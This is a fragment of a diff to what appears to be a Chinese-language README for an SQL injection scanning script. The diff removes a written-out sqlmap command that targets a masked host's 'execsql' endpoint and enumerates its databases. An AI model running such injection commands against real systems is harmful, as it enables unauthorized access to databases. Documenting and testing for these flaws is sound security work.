@@ -11,7 +11,7 @@ python3 yuantian_sql_scan.py -f url.txt 批量检测
 
 
 sql注入执行
-python sqlmap.py -u "https://xxx.xxx.xxx.xxx/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5" --dbs
+
 ![](./sql1.png)
 ![](./sql2.png)
 
